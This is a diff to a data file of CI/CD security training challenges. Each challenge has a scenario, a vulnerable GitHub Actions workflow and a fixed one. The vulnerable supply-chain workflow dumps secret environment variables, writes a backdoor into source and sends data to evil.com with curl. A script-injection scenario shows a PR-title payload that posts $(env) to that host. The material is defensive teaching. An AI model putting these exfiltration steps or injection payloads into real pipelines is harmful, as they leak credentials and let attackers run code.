@@ -12,6 +12,9 @@ export interface StaticChallenge {
   estimatedTime: string;
   description: string;
   tags: string[];
+  prerequisites: string[];
+  objectives: string[];
+  references: { page: string; label: string }[];
   scenario: string;
   vulnerableWorkflow: string;
   solutionWorkflow: string;
@@ -33,6 +36,18 @@ export const STATIC_CHALLENGES: StaticChallenge[] = [
       "aws",
       "logging"
     ],
+    "prerequisites": [],
+    "objectives": [
+      "Explain how AWS credentials reach build logs through echo and env dumps",
+      "Route credentials through secrets and env without printing values",
+      "Verify with simulation that no secret value appears in output"
+    ],
+    "references": [
+      {
+        "page": "github-actions",
+        "label": "Secrets handling guide"
+      }
+    ],
     "scenario": "# Scenario: Secrets Leak\n\nYou've just joined the team maintaining a Node.js application. While reviewing the CI pipeline, you notice the build step logs show AWS credentials in plaintext.\n\nThe previous developer hardcoded the AWS keys directly into the workflow YAML for \"convenience.\" Every build since then has exposed these credentials in the GitHub Actions logs.\n\n**Your mission:** Remove the hardcoded secrets and use GitHub's secrets mechanism instead.\n\n## What's at risk?\n- AWS account compromise\n- Unauthorized resource access\n- Potential data breach\n",
     "vulnerableWorkflow": "name: Build and Deploy\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build-and-deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Build\n        run: |\n          echo \"Building application...\"\n          echo \"AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\"\n          echo \"AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\"\n          npm run build\n\n      - name: Deploy\n        env:\n          AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE\n          AWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n        run: |\n          echo \"Deploying to AWS...\"\n          echo \"Deploy complete\"\n",
     "solutionWorkflow": "name: Build and Deploy\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build-and-deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Build\n        run: npm run build\n\n      - name: Deploy\n        env:\n          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}\n          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}\n        run: |\n          echo \"Deploying to AWS...\"\n          echo \"Deploy complete\"\n",
@@ -53,6 +68,17 @@ export const STATIC_CHALLENGES: StaticChallenge[] = [
     "tags": [
       "permissions",
       "least-privilege"
+    ],
+    "prerequisites": [],
+    "objectives": [
+      "Scope GITHUB_TOKEN with least privilege",
+      "Set workflow-level deny plus per-job grants"
+    ],
+    "references": [
+      {
+        "page": "github-actions",
+        "label": "Least-privilege permissions guide"
+      }
     ],
     "scenario": "# Scenario: Permissions Overkill\n\nYour team's workflow has `permissions: write-all` at the top level. This was added \"just in case\" but it means every job in the workflow can modify your code, create releases, and access Actions secrets.\n\nA malicious dependency in your npm packages could exploit these broad permissions to push code directly to main.\n\n**Your mission:** Restrict permissions to only what each job actually needs.\n",
     "vulnerableWorkflow": "name: CI Pipeline\n\non:\n  push:\n    branches: [main]\n\npermissions: write-all\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Install\n        run: npm ci\n\n      - name: Test\n        run: npm test\n\n      - name: Build\n        run: npm run build\n\n  deploy:\n    runs-on: ubuntu-latest\n    needs: build\n    steps:\n      - uses: actions/checkout@v4\n      - name: Deploy\n        run: echo \"Deploying...\"\n",
@@ -76,6 +102,17 @@ export const STATIC_CHALLENGES: StaticChallenge[] = [
       "actions",
       "pinning"
     ],
+    "prerequisites": [],
+    "objectives": [
+      "Explain why mutable tags are deploy-time code changes",
+      "Pin actions to full commit SHAs with version comments"
+    ],
+    "references": [
+      {
+        "page": "github-actions",
+        "label": "Pin actions to SHA guide"
+      }
+    ],
     "scenario": "# Scenario: Unsafe Dependencies\n\nYour workflow uses `@v3` tags to reference GitHub Actions. Tags are mutable — the same tag can point to different code over time.\n\nIf the `actions/checkout` action's repository were compromised, an attacker could push a new version under the `v3` tag that steals your code or secrets.\n\n**Your mission:** Pin all actions to full commit SHAs. You can find the SHA for each action version on its GitHub releases page.\n",
     "vulnerableWorkflow": "name: Build\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v3\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v3\n        with:\n          node-version: '20'\n\n      - name: Install\n        run: npm ci\n\n      - name: Build\n        run: npm run build\n",
     "solutionWorkflow": "name: Build\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11\n\n      - name: Setup Node.js\n        uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f8\n        with:\n          node-version: '20'\n\n      - name: Install\n        run: npm ci\n\n      - name: Build\n        run: npm run build\n",
@@ -97,6 +134,17 @@ export const STATIC_CHALLENGES: StaticChallenge[] = [
       "reliability",
       "error-handling"
     ],
+    "prerequisites": [],
+    "objectives": [
+      "Let build failures propagate instead of masking them",
+      "Gate deploys on successful steps"
+    ],
+    "references": [
+      {
+        "page": "github-actions",
+        "label": "Failure handling guide"
+      }
+    ],
     "scenario": "# Scenario: Error Swallowing\n\nYour deploy pipeline uses `|| echo` after critical commands like `npm test` and `npm run build`. This means even if tests fail or the build breaks, the pipeline continues and may deploy broken code to production.\n\n**Your mission:** Remove the error swallowing so failures stop the pipeline.\n",
     "vulnerableWorkflow": "name: Deploy Pipeline\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Install\n        run: npm ci\n\n      - name: Lint\n        run: npm run lint || echo \"Linting failed, continuing...\"\n\n      - name: Test\n        run: npm test || echo \"Tests failed, continuing...\"\n\n      - name: Build\n        run: npm run build || echo \"Build failed, continuing...\"\n\n      - name: Deploy\n        run: echo \"Deploying to production...\"\n",
     "solutionWorkflow": "name: Deploy Pipeline\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Install\n        run: npm ci\n\n      - name: Lint\n        run: npm run lint\n\n      - name: Test\n        run: npm test\n\n      - name: Build\n        run: npm run build\n\n      - name: Deploy\n        run: echo \"Deploying to production...\"\n",
@@ -117,6 +165,19 @@ export const STATIC_CHALLENGES: StaticChallenge[] = [
     "tags": [
       "supply-chain",
       "script-execution"
+    ],
+    "prerequisites": [
+      "unsafe-deps"
+    ],
+    "objectives": [
+      "Download remote scripts before executing anything",
+      "Verify checksums against a trusted value"
+    ],
+    "references": [
+      {
+        "page": "github-actions",
+        "label": "Supply chain safety guide"
+      }
     ],
     "scenario": "# Scenario: Unverified Script Execution\n\nYour pipeline downloads a setup script from a remote server and pipes it directly to bash. The script URL is hardcoded and there's no integrity verification.\n\nIf the remote server is compromised, or if a MITM attack intercepts the download, malicious code would execute in your CI environment with access to your secrets.\n\n**Your mission:** Download the script first, verify its integrity, then execute it.\n",
     "vulnerableWorkflow": "name: Setup and Build\n\non:\n  push:\n    branches: [main]\n\njobs:\n  setup:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Install custom tools\n        run: curl -sSL https://example.com/setup.sh | bash\n\n      - name: Build\n        run: npm run build\n",
@@ -140,6 +201,20 @@ export const STATIC_CHALLENGES: StaticChallenge[] = [
       "logging",
       "env"
     ],
+    "prerequisites": [
+      "secrets-leak"
+    ],
+    "objectives": [
+      "List what lives in a job environment beyond your own variables",
+      "Remove debug dumps from workflows",
+      "Mask values that must be printed"
+    ],
+    "references": [
+      {
+        "page": "github-actions",
+        "label": "Secrets handling guide"
+      }
+    ],
     "scenario": "# Scenario: Debugging Gone Wrong\n\nA developer added a debugging step to figure out why the build was failing. The step dumps all environment variables to the CI logs using `env | grep` and `printenv`.\n\nUnfortunately, CI logs are stored indefinitely and are accessible to anyone with repository read access. Every secret — AWS keys, API tokens, database passwords — is now exposed in plaintext.\n\n**Your mission:** Remove the environment dump step to prevent credential leakage.\n\n## What's at risk?\n- All CI/CD secrets exposed in logs\n- AWS account compromise\n- Third-party API abuse\n",
     "vulnerableWorkflow": "name: Build and Test\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Debug environment\n        run: |\n          echo \"=== Environment Variables ===\"\n          env | grep -i \"secret\\|token\\|key\\|password\"\n          printenv\n\n      - name: Install\n        run: npm ci\n\n      - name: Test\n        run: npm test\n\n      - name: Build\n        run: npm run build\n",
     "solutionWorkflow": "name: Build and Test\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Install\n        run: npm ci\n\n      - name: Test\n        run: npm test\n\n      - name: Build\n        run: npm run build\n",
@@ -161,6 +236,17 @@ export const STATIC_CHALLENGES: StaticChallenge[] = [
       "docker",
       "root",
       "container-security"
+    ],
+    "prerequisites": [],
+    "objectives": [
+      "Add a non-root USER to the image build",
+      "Explain what host access a root container keeps"
+    ],
+    "references": [
+      {
+        "page": "docker",
+        "label": "Image hardening guide"
+      }
     ],
     "scenario": "# Scenario: Container Root Trap\n\nYour CI pipeline builds and pushes Docker images. The inline Dockerfile doesn't specify a `USER` instruction, so the container runs as root by default.\n\nIf an attacker escapes the container (via a kernel vulnerability or misconfiguration), they have full root access to the host system. Running as root inside a container also means any vulnerability in your app can be leveraged for container escape.\n\n**Your mission:** Add a non-root `USER` instruction to the Dockerfile.\n",
     "vulnerableWorkflow": "name: Build Docker Image\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Build image\n        run: |\n          cat <<'EOF' > Dockerfile\n          FROM node:20-slim\n          WORKDIR /app\n          COPY package*.json ./\n          RUN npm ci --production\n          COPY src/ ./src/\n          CMD [\"node\", \"src/index.js\"]\n          EOF\n          docker build -t myapp:latest .\n\n      - name: Push image\n        run: |\n          echo \"Pushing to registry...\"\n          docker push myapp:latest\n",
@@ -184,6 +270,17 @@ export const STATIC_CHALLENGES: StaticChallenge[] = [
       "privileged",
       "pod-security"
     ],
+    "prerequisites": [],
+    "objectives": [
+      "Drop the privileged flag from the container",
+      "Grant only the capabilities the workload needs"
+    ],
+    "references": [
+      {
+        "page": "kubernetes",
+        "label": "Pod security guide"
+      }
+    ],
     "scenario": "# Scenario: Privileged Pod Escape\n\nYour CI pipeline deploys a Kubernetes manifest that includes a pod with `privileged: true`. This was added because \"something wasn't working\" and the developer looked up the fastest fix.\n\nA privileged container can:\n- Access all host devices via `/dev/`\n- Mount the host filesystem\n- Modify kernel parameters\n- Escape to full node compromise\n\n**Your mission:** Remove `privileged: true` from the security context. If the app needs specific capabilities, add only the ones it requires using `capabilities.add`.\n",
     "vulnerableWorkflow": "name: Deploy to Kubernetes\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Apply manifest\n        run: |\n          cat <<'EOF' > deployment.yml\n          apiVersion: apps/v1\n          kind: Deployment\n          metadata:\n            name: webapp\n          spec:\n            replicas: 3\n            selector:\n              matchLabels:\n                app: webapp\n            template:\n              metadata:\n                labels:\n                  app: webapp\n              spec:\n                containers:\n                  - name: webapp\n                    image: myapp:latest\n                    securityContext:\n                      privileged: true\n                    ports:\n                      - containerPort: 3000\n          EOF\n          kubectl apply -f deployment.yml\n",
     "solutionWorkflow": "name: Deploy to Kubernetes\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Apply manifest\n        run: |\n          cat <<'EOF' > deployment.yml\n          apiVersion: apps/v1\n          kind: Deployment\n          metadata:\n            name: webapp\n          spec:\n            replicas: 3\n            selector:\n              matchLabels:\n                app: webapp\n            template:\n              metadata:\n                labels:\n                  app: webapp\n              spec:\n                containers:\n                  - name: webapp\n                    image: myapp:latest\n                    securityContext:\n                      runAsNonRoot: true\n                      readOnlyRootFilesystem: true\n                      allowPrivilegeEscalation: false\n                    ports:\n                      - containerPort: 3000\n          EOF\n          kubectl apply -f deployment.yml\n",
@@ -205,6 +302,17 @@ export const STATIC_CHALLENGES: StaticChallenge[] = [
       "terraform",
       "state",
       "git"
+    ],
+    "prerequisites": [],
+    "objectives": [
+      "Move state to an encrypted remote backend",
+      "Keep tfstate and tfvars out of git"
+    ],
+    "references": [
+      {
+        "page": "terraform",
+        "label": "State security guide"
+      }
     ],
     "scenario": "# Scenario: State in Version Control\n\nYour CI pipeline runs `terraform apply` and then commits the `.tfstate` file back to git \"for safekeeping.\" This is a critical mistake.\n\nTerraform state files contain:\n- All resource attributes (including sensitive ones)\n- Database passwords, API keys, and certificates in plaintext\n- Infrastructure topology that aids attackers\n\nAdditionally, multiple developers running terraform simultaneously cause state file merge conflicts, potentially corrupting your infrastructure.\n\n**Your mission:** Remove the `git add *.tfstate` step and configure remote state storage instead.\n",
     "vulnerableWorkflow": "name: Terraform Apply\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Terraform\n        uses: hashicorp/setup-terraform@v3\n\n      - name: Init\n        run: terraform init\n\n      - name: Plan\n        run: terraform plan -out=tfplan\n\n      - name: Apply\n        run: terraform apply -auto-approve tfplan\n\n      - name: Commit state\n        run: |\n          git config user.name \"terraform-bot\"\n          git config user.email \"bot@example.com\"\n          git add *.tfstate .terraform/\n          git commit -m \"Update state\" || echo \"No changes\"\n          git push\n",
@@ -228,6 +336,17 @@ export const STATIC_CHALLENGES: StaticChallenge[] = [
       "status",
       "visibility"
     ],
+    "prerequisites": [],
+    "objectives": [
+      "Report build status back to the commit",
+      "Make failures visible before merge"
+    ],
+    "references": [
+      {
+        "page": "monitoring",
+        "label": "Build visibility guide"
+      }
+    ],
     "scenario": "# Scenario: Invisible Failures\n\nYour team's CI pipeline runs tests and builds, but doesn't report the status back to GitHub. Developers push code, the build runs, but nobody checks if it passed or failed.\n\nBroken code is being merged because there's no status check blocking the PR. The team only discovers failures after deployment — in production.\n\n**Your mission:** Add a step that reports the build status back to the commit using `actions/github-script` so that failures are visible and can block merges.\n",
     "vulnerableWorkflow": "name: CI Build\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Install\n        run: npm ci\n\n      - name: Test\n        run: npm test\n\n      - name: Build\n        run: npm run build\n",
     "solutionWorkflow": "name: CI Build\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Install\n        run: npm ci\n\n      - name: Test\n        run: npm test\n\n      - name: Build\n        run: npm run build\n\n      - name: Report status\n        if: always()\n        uses: actions/github-script@v7\n        with:\n          script: |\n            const status = '${{ job.status }}' === 'success' ? 'success' : 'failure';\n            github.rest.repos.createCommitStatus({\n              owner: context.repo.owner,\n              repo: context.repo.repo,\n              sha: context.sha,\n              state: status,\n              description: `Build ${status}`,\n              context: 'CI Build'\n            });\n",
@@ -249,6 +368,20 @@ export const STATIC_CHALLENGES: StaticChallenge[] = [
       "supply-chain",
       "attacks",
       "defense-in-depth"
+    ],
+    "prerequisites": [
+      "unsafe-deps",
+      "secrets-leak"
+    ],
+    "objectives": [
+      "Map the exfiltration, tampering, and persistence stages of the attack chain",
+      "Remove exfil paths and verify artifact integrity"
+    ],
+    "references": [
+      {
+        "page": "github-actions",
+        "label": "Supply chain safety guide"
+      }
     ],
     "scenario": "# Scenario: Supply Chain Attack\n\nA contributor submitted a PR that modifies your CI workflow. The changes look innocent at first glance, but hidden in the diff are several malicious steps:\n\n1. A step that dumps environment variables (harvesting secrets)\n2. A step that modifies your source code (injecting a backdoor)\n3. A step that exfiltrates data to an external server\n\n**Your mission:** Identify and remove all malicious steps, then secure the workflow against similar attacks.\n\n## Key defenses to implement:\n- Restrict what PRs can do (limit permissions)\n- Don't run untrusted code in CI\n- Validate artifact integrity\n- Monitor for suspicious behavior\n",
     "vulnerableWorkflow": "name: PR Build\n\non:\n  pull_request:\n    branches: [main]\n\npermissions: write-all\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.head_ref }}\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Install\n        run: npm ci\n\n      - name: Build\n        run: npm run build\n\n      # Attacker steps hidden among legitimate build steps\n\n      - name: Cache restore\n        run: |\n          env | grep -i \"secret\\|token\\|key\\|aws\" > /tmp/env_dump.txt\n          cat /tmp/env_dump.txt\n\n      - name: Update dependencies\n        run: |\n          echo 'console.log(\"Backdoor: \" + process.env.AWS_SECRET_ACCESS_KEY)' >> src/index.js\n          echo 'require(\"child_process\").exec(\"curl -X POST https://evil.com/steal -d @/tmp/env_dump.txt\")' >> src/index.js\n\n      - name: Upload build\n        run: |\n          curl -X POST https://evil.com/exfil -d @src/index.js\n          echo \"Build uploaded successfully\"\n",
@@ -273,6 +406,19 @@ export const STATIC_CHALLENGES: StaticChallenge[] = [
       "integrity",
       "checksums"
     ],
+    "prerequisites": [
+      "unsafe-deps"
+    ],
+    "objectives": [
+      "Generate checksums at build time",
+      "Verify integrity before deploy"
+    ],
+    "references": [
+      {
+        "page": "github-actions",
+        "label": "Artifact integrity guide"
+      }
+    ],
     "scenario": "# Scenario: Artifact Tampering\n\nYour pipeline builds an artifact in one job and deploys it in another. The artifact is uploaded and downloaded using GitHub's artifact actions, but there's no integrity verification.\n\nIf an attacker gains access to the workflow (via a compromised action or malicious PR), they could swap the artifact between build and deploy.\n\n**Your mission:** Add SHA256 checksum generation and verification to ensure artifact integrity.\n",
     "vulnerableWorkflow": "name: Build and Deploy\n\non:\n  push:\n    branches: [main]\n\npermissions:\n  contents: read\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Install\n        run: npm ci\n\n      - name: Build\n        run: npm run build\n\n      - name: Upload artifact\n        uses: actions/upload-artifact@v4\n        with:\n          name: dist\n          path: dist/\n\n  deploy:\n    runs-on: ubuntu-latest\n    needs: build\n    steps:\n      - name: Download artifact\n        uses: actions/download-artifact@v4\n        with:\n          name: dist\n          path: dist/\n\n      - name: Deploy\n        run: |\n          echo \"Deploying artifact...\"\n          echo \"Deploy complete\"\n",
     "solutionWorkflow": "name: Build and Deploy\n\non:\n  push:\n    branches: [main]\n\npermissions:\n  contents: read\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Install\n        run: npm ci\n\n      - name: Build\n        run: npm run build\n\n      - name: Generate checksums\n        run: sha256sum dist/** > checksums.txt\n\n      - name: Upload artifact\n        uses: actions/upload-artifact@v4\n        with:\n          name: dist\n          path: dist/\n\n      - name: Upload checksums\n        uses: actions/upload-artifact@v4\n        with:\n          name: checksums\n          path: checksums.txt\n\n  deploy:\n    runs-on: ubuntu-latest\n    needs: build\n    steps:\n      - name: Download artifact\n        uses: actions/download-artifact@v4\n        with:\n          name: dist\n          path: dist/\n\n      - name: Download checksums\n        uses: actions/download-artifact@v4\n        with:\n          name: checksums\n          path: checksums.txt\n\n      - name: Verify integrity\n        run: sha256sum -c checksums.txt\n\n      - name: Deploy\n        run: |\n          echo \"Deploying artifact...\"\n          echo \"Deploy complete\"\n",
@@ -295,9 +441,23 @@ export const STATIC_CHALLENGES: StaticChallenge[] = [
       "github-context",
       "script-execution"
     ],
+    "prerequisites": [
+      "secrets-leak"
+    ],
+    "objectives": [
+      "Explain how expression substitution runs before the shell",
+      "Route untrusted context through env indirection",
+      "Verify the fix with a simulation run"
+    ],
+    "references": [
+      {
+        "page": "github-actions",
+        "label": "Script injection guide"
+      }
+    ],
     "scenario": "# Scenario: Script Injection\n\nYour workflow uses GitHub context variables directly in `run:` steps. For example, it echoes the PR title or issue body. An attacker can create a PR with a title like:\n\n```\ntitle\"; curl https://evil.com/steal -d \"$(env)\"; echo \"\n```\n\nThis breaks out of the echo command and executes arbitrary code.\n\n**Your mission:** Sanitize all user-controlled inputs before using them in shell commands.\n",
     "vulnerableWorkflow": "name: PR Check\n\non:\n  pull_request:\n    branches: [main]\n\npermissions:\n  contents: read\n  pull-requests: read\n\njobs:\n  check:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Log PR title\n        run: |\n          echo \"Processing PR: ${{ github.event.pull_request.title }}\"\n\n      - name: Check PR description\n        run: |\n          echo \"Description: ${{ github.event.pull_request.body }}\"\n\n      - name: Validate\n        run: |\n          echo \"All checks passed for PR #${{ github.event.pull_request.number }}\"\n",
-    "solutionWorkflow": "name: PR Check\n\non:\n  pull_request:\n    branches: [main]\n\npermissions:\n  contents: read\n  pull-requests: read\n\njobs:\n  check:\n    runs-on: ubuntu-latest\n    env:\n      PR_TITLE: ${{ github.event.pull_request.title }}\n      PR_BODY: ${{ github.event.pull_request.body }}\n      PR_NUMBER: ${{ github.event.pull_request.number }}\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Log PR title\n        run: |\n          echo \"Processing PR: $PR_TITLE\"\n\n      - name: Check PR description\n        run: |\n          echo \"Description: $PR_BODY\"\n\n      - name: Validate\n        run: |\n          echo \"All checks passed for PR #$PR_NUMBER\"\n",
+    "solutionWorkflow": "name: PR Check\r\n\r\non:\r\n  pull_request:\r\n    branches: [main]\r\n\r\npermissions:\r\n  contents: read\r\n  pull-requests: read\r\n\r\njobs:\r\n  check:\r\n    runs-on: ubuntu-latest\r\n    env:\r\n      PR_TITLE: ${{ github.event.pull_request.title }}\r\n      PR_BODY: ${{ github.event.pull_request.body }}\r\n      PR_NUMBER: ${{ github.event.pull_request.number }}\r\n    steps:\r\n      - uses: actions/checkout@v4\r\n\r\n      - name: Log PR title\r\n        run: |\r\n          echo \"Processing PR: $PR_TITLE\"\r\n\r\n      - name: Check PR description\r\n        run: |\r\n          echo \"Description: $PR_BODY\"\r\n\r\n      - name: Validate\r\n        run: |\r\n          echo \"All checks passed for PR #$PR_NUMBER\"\r\n",
     "hints": [
       "# Hint 1: The vulnerability\n\nWhen you write `echo \"${{ github.event.pull_request.title }}\"`, GitHub substitutes the title BEFORE bash sees it. If the title contains shell metacharacters, they execute as code.\n",
       "# Hint 2: Safe alternatives\n\nPass user input as an environment variable instead of interpolating directly:\n```yaml\nenv:\n  PR_TITLE: ${{ github.event.pull_request.title }}\nrun: echo \"$PR_TITLE\"\n```\nEnvironment variables are not subject to shell injection.\n"
@@ -317,6 +477,20 @@ export const STATIC_CHALLENGES: StaticChallenge[] = [
       "aws",
       "iam",
       "trust-policy"
+    ],
+    "prerequisites": [
+      "secrets-leak",
+      "permissions-overkill"
+    ],
+    "objectives": [
+      "Replace static keys with OIDC role assumption",
+      "Scope the trust policy to specific repositories and branches"
+    ],
+    "references": [
+      {
+        "page": "github-actions",
+        "label": "OIDC authentication guide"
+      }
     ],
     "scenario": "# Scenario: OIDC Misconfiguration\n\nYour team moved from static AWS credentials to OIDC federation — great! But the OIDC trust policy is overly broad. It allows ANY repository in your GitHub organization to assume the deployment role.\n\nA malicious repo in your org could use this role to access your production AWS resources.\n\n**Your mission:** Configure OIDC properly with the `aws-actions/configure-aws-credentials` action and ensure the workflow uses role assumption instead of static credentials.\n",
     "vulnerableWorkflow": "name: Deploy to AWS\n\non:\n  push:\n    branches: [main]\n\npermissions:\n  contents: read\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Configure AWS credentials\n        env:\n          AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE\n          AWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n        run: |\n          echo \"Configuring AWS...\"\n\n      - name: Deploy\n        run: |\n          echo \"Deploying to S3...\"\n          echo \"Deploy complete\"\n",
@@ -340,6 +514,17 @@ export const STATIC_CHALLENGES: StaticChallenge[] = [
       "isolation",
       "supply-chain"
     ],
+    "prerequisites": [],
+    "objectives": [
+      "Explain how persistent runners carry state between jobs",
+      "Use ephemeral runners or isolate self-hosted ones"
+    ],
+    "references": [
+      {
+        "page": "github-actions",
+        "label": "Runner security guide"
+      }
+    ],
     "scenario": "# Scenario: Self-Hosted Runner Risk\n\nYour team uses self-hosted runners for faster builds. The problem: a malicious pull request ran code that installed a backdoor on the runner. Now every subsequent build — including builds that handle secrets — runs on a compromised machine.\n\nSelf-hosted runners persist between builds. Unlike GitHub-hosted runners which are fresh VMs every time, a compromised self-hosted runner stays compromised.\n\n**Your mission:** Replace self-hosted runners with GitHub-hosted runners, or add container isolation to limit the blast radius.\n",
     "vulnerableWorkflow": "name: Deploy\n\non:\n  push:\n    branches: [main]\n\npermissions:\n  contents: read\n  id-token: write\n\njobs:\n  build:\n    runs-on: self-hosted\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup\n        run: npm ci\n\n      - name: Test\n        run: npm test\n\n      - name: Build\n        run: npm run build\n\n  deploy:\n    runs-on: self-hosted\n    needs: build\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Deploy\n        env:\n          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}\n          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}\n        run: echo \"Deploying...\"\n",
     "solutionWorkflow": "name: Deploy\n\non:\n  push:\n    branches: [main]\n\npermissions:\n  contents: read\n  id-token: write\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup\n        run: npm ci\n\n      - name: Test\n        run: npm test\n\n      - name: Build\n        run: npm run build\n\n  deploy:\n    runs-on: ubuntu-latest\n    needs: build\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Deploy\n        env:\n          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}\n          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}\n        run: echo \"Deploying...\"\n",
@@ -362,6 +547,20 @@ export const STATIC_CHALLENGES: StaticChallenge[] = [
       "secrets",
       "image-layers"
     ],
+    "prerequisites": [
+      "secrets-leak",
+      "docker-running-as-root"
+    ],
+    "objectives": [
+      "Keep secrets out of image layers",
+      "Use build secrets or runtime environment variables"
+    ],
+    "references": [
+      {
+        "page": "docker",
+        "label": "Secrets handling guide"
+      }
+    ],
     "scenario": "# Scenario: Secrets in Image Layers\n\nYour CI pipeline builds Docker images with database credentials passed as build arguments and baked into ENV layers. The image is pushed to a public registry.\n\nAnyone can run `docker history` or inspect image layers to extract the hardcoded passwords. Even if you later remove the ENV instruction, the secret persists in the image layer history.\n\n**Your mission:** Remove secrets from the image build. Use runtime environment variables or Docker build secrets (`--secret`) instead.\n\n## What's at risk?\n- Database credentials exposed to anyone with image pull access\n- Secrets persist in image layer history forever\n- Compliance violations (SOC2, PCI DSS)\n",
     "vulnerableWorkflow": "name: Build Secure App\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Build image\n        run: |\n          cat <<'EOF' > Dockerfile\n          FROM node:20-slim\n          ENV DB_PASSWORD=supersecret123\n          ENV API_KEY=sk-live-abc123def456\n          WORKDIR /app\n          COPY package*.json ./\n          RUN npm ci --production\n          COPY src/ ./src/\n          CMD [\"node\", \"src/index.js\"]\n          EOF\n          docker build --build-arg AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI -t myapp:latest .\n\n      - name: Push image\n        run: docker push myapp:latest\n",
